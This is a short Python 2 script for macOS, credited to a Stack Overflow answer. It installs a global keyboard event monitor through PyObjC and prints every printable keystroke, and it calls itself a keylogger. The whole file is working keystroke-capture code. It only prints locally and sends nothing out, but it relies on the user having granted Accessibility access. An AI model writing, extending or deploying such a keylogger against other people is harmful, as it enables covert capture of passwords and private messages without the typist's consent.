#!/usr/bin/python2.6

# code source: http://stackoverflow.com/questions/12389665/python-capture-keystrokes-values-in-text-file-on-os-x
#
# You need to install keycode module using this:
#   git clone clone https://github.com/abarnert/pykeycode.git
#   sudo python setup.py install

#  You _must_ turn on assistive devices under Accessibility prefpane
# for any of this code to work. Otherwise it won't do anything.

from Cocoa import *
from Foundation import *
from PyObjCTools import AppHelper
import keycode
import string
import sys


class AppDelegate(NSObject):

    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(
            NSKeyDownMask, handler)


def handler(event):
    if event.type() == NSKeyDown and keycode.tostring(event.keyCode()) in string.printable:
        print keycode.tostring(event.keyCode())


def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()


if __name__ == '__main__':
    print "Keylogger started..."
    main()
